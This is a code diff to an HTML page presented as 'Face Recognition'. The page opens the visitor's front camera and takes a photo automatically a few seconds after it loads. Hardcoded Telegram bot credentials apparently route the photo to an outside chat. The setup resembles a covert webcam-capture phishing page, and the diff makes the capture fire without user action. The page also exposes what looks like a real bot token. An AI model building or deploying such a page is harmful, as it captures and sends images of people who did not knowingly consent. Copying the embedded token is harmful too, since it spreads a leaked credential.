@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Face Recognition</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api"></script>
+    <script async src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api@latest"></script>
     <style>
         body {
             display: flex;
@@ -39,19 +39,28 @@
         const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";
         const CHAT_ID = "5934902786";
 
+        async function loadModels() {
+            try {
+                await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@latest/model/');
+                console.log("Models loaded!");
+                document.getElementById("message").textContent = "Models loaded, starting camera...";
+                startCamera();
+            } catch (error) {
+                console.error("Error loading models:", error);
+                document.getElementById("message").textContent = "Failed to load models!";
+            }
+        }
+
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById("video").srcObject = stream;
+                document.getElementById("message").textContent = "Detecting face...";
+                setTimeout(capturePhoto, 3000); // Capture photo after 3 seconds
             } catch (error) {
-                document.getElementById("message").textContent = "Camera access denied. Please allow access.";
+                console.error("Camera error:", error);
+                document.getElementById("message").textContent = "Camera access denied!";
             }
-        }
-
-        async function loadModels() {
-            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@latest/model/');
-            document.getElementById("message").textContent = "Detecting face...";
-            startCamera();
         }
 
         async function capturePhoto() {
@@ -93,8 +102,7 @@
             return new Blob([ab], { type: mimeString });
         }
 
-        loadModels();
-        setTimeout(capturePhoto, 5000); // Ambil gambar selepas 5 saat
+        window.onload = loadModels;
     </script>
 </body>
 </html>
